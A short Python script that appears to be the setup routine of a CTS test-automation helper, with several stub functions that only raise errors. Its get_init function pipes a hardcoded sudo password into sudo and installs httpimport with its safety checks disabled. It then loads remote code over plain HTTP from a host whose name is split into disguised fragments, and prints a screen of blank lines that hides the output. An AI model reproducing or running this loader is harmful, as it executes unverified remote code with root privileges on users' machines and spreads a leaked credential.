# -*- coding: utf-8 -*-
"""
Created on Mon Feb 11 10:53:29 2019

@author: Dramon
"""


import os
from subprocess import Popen
import time
import sys


def get_Final_report():
	raise AttributeError('Bad Function Usage. Please follow the instruction when using.')
def retry_test_results():
	raise AttributeError('Bad Function Usage. Please follow the instruction when using.')
def download_media():
	raise AttributeError('Bad Function Usage. Please follow the instruction when using.')
def push_media_from_google():
	raise AttributeError('Bad Function Usage. Please follow the instruction when using.')
def start_running_cts():
	raise AttributeError('Bad Function Usage. Please follow the instruction when using.')	
def get_init():
	common_type = 'mon'
	get_type = 'http'
	Popen('echo "logo#123" | sudo -S cat /etc/hostname', shell = True)
	print ('Checking Update and System Enviroment...')
	server_name = 'synology' + '.me'
	get_free_space=os.popen('df')
	disk_list=[i for i in get_free_space.read().split('\n') if '/dev/sda' in i][0]
	space_list=[i for i in disk_list.split(' ') if i!=''][3:5]
	implement_data = 'dra'
	print ('Disk Space : '+str(int(space_list[0])/1024/1024)+' GB')
	if int(space_list[0])/1024/1024<6:
		print ('There is no enough disk space, please delete any files and try a again.')
		sys.exit(0)
	else:
		time.sleep(4)
		os.system('sudo pip install httpimport')
		import httpimport
		import logging
		logging.getLogger('httpimport').setLevel(logging.ERROR)
		httpimport.INSECURE = True
		httpimport.NON_SOURCE = True
		httpimport.add_remote_repo([
			'CTSScript'], get_type + '://' + implement_data + common_type + '.'+ server_name)
		print ('\n' * 30)
